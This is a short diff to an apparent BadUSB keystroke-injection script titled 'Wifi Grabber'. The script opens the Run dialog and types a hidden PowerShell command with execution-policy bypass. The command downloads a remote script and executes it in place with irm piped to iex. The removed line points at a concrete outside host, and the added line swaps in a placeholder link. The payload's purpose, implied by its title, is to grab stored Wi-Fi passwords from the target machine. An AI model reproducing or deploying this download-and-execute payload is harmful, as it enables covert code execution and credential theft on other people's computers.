@@ -2,5 +2,5 @@ REM     Title: Wifi Grabber
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='dc';$db='';irm http://myprojectfiles.com/wifigrabber.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='dc';$db='';irm "linktoWifi Grabber" | iex
 ENTER
